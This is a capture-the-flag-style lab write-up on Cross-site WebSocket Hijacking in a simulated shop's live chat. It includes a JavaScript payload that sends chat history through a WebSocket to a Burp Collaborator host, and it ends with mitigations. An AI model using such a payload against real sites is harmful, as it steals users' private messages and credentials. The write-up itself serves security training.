# Cross-site Websockte hijacking 


##  Lab Description
This lab simulates an online shop with a live chat feature using **WebSockets**. The server does not verify origin headers or use CSRF tokens during the WebSocket handshake, making it vulnerable to **Cross-site WebSocket Hijacking**. Our goal is to craft a malicious JavaScript payload that exfiltrates the chat history of a victim.


##  Steps to Exploit

1. **Trigger the WebSocket:**
   - Click on **"Live chat"** and send a dummy message to populate chat history.

2. **Reload the page** to ensure the message is stored.

3. **Capture WebSocket Activity in Burp:**
   - Go to **Burp Suite → Proxy → WebSockets tab**.
   - Look for a **"READY"** message sent by the client which causes the server to respond with previous chat history.

4. **Grab WebSocket Handshake:**
   - In Burp’s **HTTP history**, locate the WebSocket handshake request (usually `GET /chat`) with status code 101.
   - **Right-click → Copy URL**.

5. **Build the Exploit Payload:**
   - Use the following JavaScript on the exploit server:

```html
<script>
  var ws = new WebSocket('wss://<websocket-url>');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch("https://<your-collaborator>.burpcollaborator.net", {
      method: "POST",
      mode: "no-cors",
      body: event.data
    });
  };
</script>
```

6. **Deliver the Payload:**
   - Host the above payload using the provided **exploit server**.
   - Send the exploit link to the victim or simulate their click.

7. **Observe the Exfiltrated Data:**
   - Monitor **Burp Collaborator** for incoming data – it will contain chat history from the victim’s account.

8. **Use Captured Data to Log In / Verify Lab Completion.**


##  Impact

- Allows an attacker to hijack sensitive real-time data (chat, credentials, tokens) over WebSocket.
- Enables **cross-origin** data theft, bypassing SOP if the server doesn't verify origin.


##  Mitigation

- **Verify Origin Headers** before accepting WebSocket connections.
- Implement **authentication** on WebSocket messages.
- Use **CSRF tokens** or **session validation** within the message body.
- Only allow trusted origins and **close the socket** on mismatch.

##  References

- [PortSwigger WebSockets Security](https://portswigger.net/web-security/websockets)
- [OWASP WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/13-Testing_WebSockets)
